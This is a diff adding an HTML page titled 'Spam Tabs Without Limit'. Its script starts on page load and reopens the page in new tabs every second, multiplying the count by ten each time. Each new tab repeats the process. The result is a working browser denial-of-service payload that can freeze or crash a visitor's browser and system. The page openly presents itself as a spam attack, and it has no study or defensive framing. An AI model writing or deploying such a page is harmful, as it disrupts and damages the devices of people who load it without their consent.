@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Spam Tabs Without Limit</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #00FF00;
+      font-family: 'Courier New', Courier, monospace;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    h1 {
+      font-size: 3rem;
+      text-shadow: 0 0 5px #00FF00, 0 0 10px #00FF00, 0 0 15px #00FF00;
+    }
+    p {
+      font-size: 1.5rem;
+    }
+  </style>
+</head>
+<body>
+  <h1>WARNING: SPAM TABS ACTIVATED!</h1>
+  <p>Tab will keep opening every second with an increasing number of 10x.</p>
+
+  <script>
+    let openCount = 10; // Start by opening 10 tabs initially
+
+    // Function to open 10 new tabs
+    function openTabs() {
+      for (let i = 0; i < openCount; i++) {
+        window.open(window.location.href, "_blank"); // Open a new tab with the same URL
+      }
+      // After opening the tabs, increase the number of tabs by 10x each time
+      openCount *= 10; // Multiply by 10 after each second
+    }
+
+    // Start the tab opening process
+    function startSpammingTabs() {
+      setInterval(openTabs, 1000); // Call openTabs every 1 second
+    }
+
+    // Start spam tab as soon as the page is loaded
+    window.onload = function() {
+      startSpammingTabs();
+    };
+  </script>
+</body>
+</html>
